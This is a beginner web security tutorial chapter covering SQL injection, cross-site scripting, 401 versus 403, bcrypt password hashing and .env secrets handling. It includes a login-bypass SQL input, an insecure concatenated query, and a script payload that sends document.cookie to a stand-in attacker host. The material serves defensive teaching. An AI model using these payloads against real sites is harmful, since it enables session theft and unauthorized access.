Orientation

0. Introduction: The Web as a Hostile Environment

When you run a Python script locally on your computer, you have complete control over the input. But the moment your web server exposes port 80 or 443 to the public internet, anyone in the world can send arbitrary data to your endpoints.

Attackers do not interact with your app through your nice React buttons; they use automated tools, command-line scripts, and manipulated HTTP headers to search for vulnerabilities in your backend logic.

The Golden Rule of Web Security:

Never trust the client. All data originating from the client—form fields, URL parameters, JSON bodies, cookies, and HTTP headers—must be treated as untrusted and potentially malicious until validated by the server.

Vulnerability 01

1. SQL Injection (SQLi): Hijacking the Database

SQL Injection happens when an application carelessly concatenates untrusted user input directly into a database query string. This tricks the database into treating user data as executable programming code.

// The Catastrophic Mistake (String Concatenation in Python): 
# User enters this into the login form's username box:
user_input = "' OR '1'='1"

# Insecure query written with string formatting:
query = f"SELECT * FROM users WHERE username = '{user_input}' AND password = '{password}'"
→ The resulting query becomes: SELECT * FROM users WHERE username = '' OR '1'='1' ...
Because '1'='1' is always true, the database returns the first user in the table (usually the Admin), logging the attacker in without a password!
// HTML/CSS Diagram: Insecure String Concatenation vs. Parameterized Safety
Insecure String Interpolation
Input: ' OR '1'='1
Input alters the SQL syntax tree!
Database executes injected commands.
❌ Database breached; attacker gains full control.
Parameterized Query / ORM Defense
Input: ' OR '1'='1
Database treats input strictly as literal text!
Searches for a user whose literal name is that string.
✔ Harmless search; returns 0 rows safely.
How Modern Frameworks Protect You:

When you use an ORM (like SQLAlchemy or Django ORM that we learned in Part 4), SQL queries are automatically parameterized under the hood. You never need to write raw string formatting for queries.

Vulnerability 02

2. Cross-Site Scripting (XSS): Poisoning the Browser

While SQL Injection targets the database on your server, Cross-Site Scripting (XSS) targets other users visiting your website.

XSS occurs when an application receives untrusted data (like a blog comment) and prints it into the HTML page without sanitization or escaping. If an attacker types JavaScript into a comment box:

<script>fetch('https://evil-hacker.com/steal?cookie=' + document.cookie)</script>

When other users view that comment, their browsers will execute that script! The malicious script can steal their session tokens (from Part 3), read their private messages, or perform actions on their behalf.

// HTML/CSS Diagram: The Lifecycle of a Stored XSS Attack
1. INJECTION Attacker submits malicious <script> in a public comment form
Unsanitized text saved into DB
2. DELIVERY Innocent Victim visits the post; server delivers raw HTML containing the comment
Browser receives malicious script
3. EXECUTION Victim's browser executes the script -> Auth cookies transmitted to attacker!
Session Hijacked!
Defense Against XSS:
  • Modern Frontend Auto-Escaping: Frameworks like React (Part 5) automatically treat variables as text strings rather than executable HTML, rendering <script> harmlessly on screen.
  • HttpOnly Cookies: Storing authentication cookies with the HttpOnly flag prevents JavaScript from accessing them via document.cookie.
Concept 03

3. Authentication vs. Authorization (401 vs. 403)

Beginners frequently confuse these two terms. While they work together, they solve completely different security questions:

// HTML/CSS Diagram: The Two Security Checkpoints (AuthN then AuthZ)
1. Authentication (AuthN) Identity Check

The Question: "Who are you?"

Verifying credentials (e.g. username/password, email confirmation, biometric check, or JWT validation).

⚠️ If check fails: Return 401 Unauthorized (Meaning "Unauthenticated").
2. Authorization (AuthZ) Permission Check

The Question: "Are you allowed to do this?"

Checking permissions and roles (e.g. Can this regular user delete another user's post? Only an Admin can).

⚠️ If check fails: Return 403 Forbidden ("We know who you are, but you cannot touch this!").
The Airport Analogy:

Showing your passport at security is Authentication (proving you are Alice). Trying to walk onto an airplane without a first-class ticket is Authorization (the airline knows you are Alice, but your ticket does not grant access to the cockpit or first-class cabin).

Concept 04

4. Password Hashing: Why Passwords are Never Stored Plaintext

If an attacker ever steals your database, they should find zero readable passwords. You must never store passwords as plain text, and you must never "encrypt" them.

Encryption is Two-Way:

Anything that is encrypted can be decrypted if the secret key is found or stolen.

Hashing is a One-Way Street:

A mathematical function transforms your password into a fixed-length scramble. It is mathematically impossible to reverse the hash back into the password.

// HTML/CSS Diagram: The One-Way Salted Hash Pipeline
1. User's Plaintext Password "Secret123!"
+ Random Salt (e.g. "x8$kL2")
↓ Passes through Cryptographic Hash Function (e.g. Bcrypt)
2. Stored in Database (Permanent Scramble):
$2b$12$K8y4XoR...m8Z8Jc90qU7wP2LzY1

How login verification works: When the user logs in later, the server takes the password they typed, applies the exact same salt and algorithm, and compares the resulting hash. If the hashes match, the password is correct—without the server ever knowing the plaintext password!

Concept 05

5. Secrets Management: The Golden Rule of Git

Every web application relies on sensitive credentials: database passwords, third-party payment keys (Stripe), and JWT secret signing keys.

A Very Common Developer Disaster:

A developer hardcodes DB_PASSWORD = "supersecret123" directly into their Python code, commits it to Git, and pushes it to a public GitHub repository. Automated bot scanners scan public commits within seconds and steal the keys to compromise the infrastructure!

The Solution: Environment Variables & .env Files

Keep all sensitive configuration in a dedicated file named .env that lives on your machine but is strictly ignored by Git:

// The .env File (Local secrets only): 
DATABASE_URL=postgres://user:pass@db:5432/app
JWT_SECRET_KEY=94a8c1f0d3b84e1b...
STRIPE_API_KEY=sk_live_51M0...
// The .gitignore File: 
# Tell Git to never commit the secrets file!
.env
__pycache__/
venv/

What are Bcrypt & Python-Dotenv?

Bcrypt is the industry-standard cryptographic hashing library designed specifically to protect passwords. python-dotenv is a lightweight package that reads key-value pairs from your local .env file and sets them as system environment variables.

Installation Command:
pip install bcrypt python-dotenv
Hands-On Code: Hashing, Verifying & Loading Secrets:
import os
import bcrypt
from dotenv import load_dotenv

# 1. Load secrets from .env file into memory
load_dotenv()
database_url = os.getenv("DATABASE_URL")
print("Connected to DB:", database_url)

# 2. HASHING A NEW USER'S PASSWORD:
raw_password = "mySecretPassword123!".encode('utf-8')

# Generate a random salt and compute the hash
salt = bcrypt.gensalt()
hashed_password = bcrypt.hashpw(raw_password, salt)
print("Safe to store in DB:", hashed_password.decode('utf-8'))

# 3. VERIFYING PASSWORD ON LOGIN:
login_attempt = "mySecretPassword123!".encode('utf-8')

# bcrypt.checkpw automatically verifies match without decrypting
is_valid = bcrypt.checkpw(login_attempt, hashed_password)

if is_valid:
    print("✔ Login successful! Issue JWT token.")
else:
    print("❌ Invalid password attempt.")
Summary

7. Key Takeaways & Review

✔ Never Trust the Client: Treat every user input, parameter, and header as untrusted data that must be sanitized and validated on the backend.
✔ SQL Injection: Prevented by using parameterized queries and modern ORMs rather than concatenating raw input strings into SQL syntax.
✔ AuthN vs. AuthZ: Authentication (401) verifies identity; Authorization (403) validates permissions and access roles.
✔ One-Way Hashing: Passwords are never stored plaintext or encrypted; they are salted and hashed using one-way algorithms like Bcrypt.
✔ Secrets Isolation: Keep credentials in a .env file and ignore it with .gitignore to prevent leaking API keys to GitHub.
